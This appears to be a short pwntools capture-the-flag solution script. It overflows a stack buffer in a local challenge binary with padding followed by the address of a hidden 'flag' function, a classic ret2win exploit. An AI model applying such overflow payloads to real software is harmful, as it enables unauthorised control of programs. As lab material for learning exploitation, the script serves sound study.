
from pwn import *

# Getting flag address
static = ELF("./hidden_flag_function")
flag_address = p32(static.symbols['flag'])
payload = b"A" * 0x48 + b"B" * 4 + flag_address

# Exploiting the binary
binary = process("./hidden_flag_function")
#binary = remote("xxx", 0000)
print(binary.recv())
binary.sendline(payload)
print(binary.recvall())